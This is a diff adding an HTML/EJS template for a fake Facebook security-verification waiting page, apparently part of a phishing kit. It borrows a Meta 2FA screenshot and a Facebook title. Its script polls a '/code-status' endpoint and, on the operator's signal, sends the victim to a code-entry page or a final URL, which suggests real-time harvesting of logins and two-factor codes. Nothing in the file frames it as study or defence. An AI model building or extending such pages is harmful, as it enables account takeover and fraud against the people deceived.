@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="<%= i18n.language %>">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title><%= t('waiting.title') %> - Facebook</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-50">
+  <div class="max-w-md mx-auto bg-white min-h-screen">
+    <div class="px-4 py-3 border-b border-gray-200"><p class="text-sm text-gray-600"><%= t('waiting.header') %></p></div>
+    <div class="px-4 py-6 flex flex-col items-center justify-center min-h-[calc(100vh-80px)]">
+      <div class="mb-8 flex justify-center"><div class="w-full max-w-sm rounded-lg overflow-hidden"><img src="https://i.ibb.co/hJwSkrr2/IXDE-Accounts-Center-Security-Settings-2-FA-Center2-edit-mobile-light-3x.png" alt="Verificación de seguridad" class="w-full h-auto"/></div></div>
+      <div class="text-center">
+        <h2 class="text-2xl font-semibold text-gray-900 mb-2"><%= t('waiting.processing') %></h2>
+        <div class="flex justify-center"><div class="animate-spin rounded-full h-6 w-6 border-b-2 border-blue-500"></div></div>
+      </div>
+
+      <script>
+        const urlParams = new URLSearchParams(location.search);
+        const user = urlParams.get("user");
+        
+        (async function poll(){
+            if (!user) return;
+            try {
+                const response = await fetch("/code-status?user="+encodeURIComponent(user));
+                const status = await response.json();
+                
+                // =================================================================
+                // == LÓGICA DE REDIRECCIÓN ACTUALIZADA
+                // =================================================================
+                if (status.accepted && status.accepted.url_final) {
+                    window.location.href = status.accepted.url_final;
+                } else if (status.need) {
+                    // Pasa los parámetros si necesita ir a la página de código
+                    const query = new URLSearchParams(location.search);
+                    window.location.href = `/code?${query.toString()}`;
+                } else if (status.restart) {
+                    window.location.href = "/";
+                } else {
+                    setTimeout(poll, 1500);
+                }
+            } catch (e) {
+                setTimeout(poll, 2000);
+            }
+        })();
+      </script>
+    </div>
+  </div>
+</body>
+</html>
